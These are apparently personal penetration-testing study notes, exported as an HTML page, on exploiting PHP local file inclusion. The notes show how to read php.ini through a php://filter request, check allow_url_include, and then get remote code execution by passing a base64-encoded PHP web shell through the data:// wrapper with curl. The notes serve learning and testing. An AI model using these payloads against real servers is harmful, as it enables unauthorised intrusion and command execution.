<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Data Wrapper Attack</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Data Wrapper Attack</h1><br/><br /><br /><strong><h3>Data Wrapper</h3></strong><br /><a href="https://www.php.net/manual/en/wrappers.data.php">data</a> wrapper can be used to include external data, including PHP code.<br />Only available to use if the (<code>allow_url_include</code>) setting is enabled in the PHP configurations (<code>php.ini</code>). <br />To read the PHP configuration file through the LFI vulnerability:<br /><br /><strong>1. Read PHP Configurations through “</strong><a href="tation--Server-side--File_Inclusion--Local_File_Inclusion(LFI)_File_Disclosure--PHP_Filters_(PHP_Wrappers)--2._PHP_Source_Code_Disclosure.html">PHP Source Code Disclosure</a><strong>”</strong><br />We have to option to find the php.ini configuration file<br />• Server Configuration wordlist for linux: <a href="https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux">https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux</a> that include also PHP configurations file.<br />    To get only php.ini files:<br /><div class="codebox"><pre>    wget https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux; cat LFI-WordList-Linux | grep &#39;php.ini&#39;</pre></div><br />    <div class="codebox"><pre>/apache/php/php.ini<br />/bin/php.ini<br />/etc/httpd/php.ini<br />/etc/php.ini<br />/etc/php/apache/php.ini<br />/etc/php/apache2/php.ini<br />/etc/php/cgi/php.ini<br />/etc/php/php.ini<br />/etc/php/php4/php.ini<br />/etc/php4.4/fcgi/php.ini<br />/etc/php4/apache/php.ini<br />/etc/php4/apache2/php.ini<br />/etc/php4/cgi/php.ini<br />/etc/php5/apache/php.ini<br />/etc/php5/apache2/php.ini<br />/etc/php5/cgi/php.ini<br />/home/bin/stable/apache/php.ini<br />/home2/bin/stable/apache/php.ini<br />/NetServer/bin/stable/apache/php.ini<br />/opt/xampp/etc/php.ini<br />/php/php.ini<br />/php4/php.ini<br />/php5/php.ini<br />/usr/lib/php.ini<br />/usr/lib/php/php.ini<br />/usr/local/apache/conf/php.ini<br />/usr/local/etc/php.ini<br />/usr/local/lib/php.ini<br />/usr/local/php/lib/php.ini<br />/usr/local/php4/lib/php.ini<br />/usr/local/php5/lib/php.ini<br />/usr/local/psa/admin/conf/php.ini<br />/usr/local/Zend/etc/php.ini<br />/var/local/www/conf/php.ini<br />/web/conf/php.ini<br /></pre></div><br /><br />• PHP configurations file can also be found in:<br />   ◇ Apache → /etc/php/X.Y/apache2/php.ini<br />   ◇ Nginx → /etc/php/X.Y/fpm/php.ini<br />	*where X.Y is the PHP version of the webapp version<br />	where the PHP version available are:<br />	<div class="codebox"><pre>8.1<br />8.0<br />7.4<br />7.3<br />7.2<br />7.1<br />7.0<br />5.6<br />5.5<br />5.4<br />5.3<br />5.2<br />5.1<br />5.0<br />4.4<br />4.3<br />4.2<br />4.1<br />4.0</pre></div><br />Since .ini files are similar to PHP files we can use the same method used in <a href="tation--Server-side--File_Inclusion--Local_File_Inclusion(LFI)_File_Disclosure--PHP_Filters_(PHP_Wrappers)--2._PHP_Source_Code_Disclosure.html">PHP Source Code Disclosure</a><br /><div class="codebox"><pre>$ curl <span style="color:#3ad900;font-weight:400">&quot;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini&quot;</span></pre></div><br />    <a href=""><img src="images/2352-1.png" alt="images/2352-1.png" /></a><br />Once we have the base64 encoded string, we can decode it and <span style="text-decoration:underline;">grep</span> for <code>allow_url_include</code> (NOT enabled by default) to see its value that to work must be set to “<strong>On</strong>”<br /><div class="codebox"><pre>$ echo <span style="color:#3ad900;font-weight:400">&#39;W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=&#39;</span> | base64 -d | grep allow_url_include</pre></div><br />OR<br /><div class="codebox"><pre>cat encoded.txt | base64 -d | grep -E &#39;allow_url_include|expect&#39;</pre></div><br />    <a href=""><img src="images/2352-2.png" alt="images/2352-2.png" /></a><code><br /></code>	<code>allow_url_include = On<br /></code>If the option <em>allow_url_include</em> (NOT enabled by default) is enabled(On), <span style="text-decoration:underline;">we can use the data wrapper</span>.<br />Many web applications rely on <code>allow_url_include</code> to function properly, like:<br />   ◇ WordPress plugins<br />   ◇ Wordpress themes<br />   ◇ ....<br /><br /><strong>2. Remote Code Execution</strong><br />With <code>allow_url_include</code> enabled, we can proceed with our data wrapper attack. <br />Data wrapper can be used to include external data, including PHP code. <br />1. base64 encode a payload <br />	<div class="codebox"><pre>$ echo <span style="color:#3ad900;font-weight:400">&#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39;</span> | base64</pre></div><br />	<a href=""><img src="images/2352-3.png" alt="images/2352-3.png" /></a><br />	PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==<br />2. Pass:<br />   1) the encoded paylod to the Data Wrapper (with <code>data://text/plain;base64,[ENCODEDATA]</code>) that has the ability to decode it and execute the PHP code. <br />   2) commands to the web shell with <code>&amp;cmd=&lt;COMMAND&gt;</code><br />	<div class="codebox"><pre>$ curl -s <span style="color:#3ad900;font-weight:400">&#39;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==&amp;cmd=id&#39;</span> | grep uid</pre></div><br /><code><br /><br /></code></div>
</body>
</html>
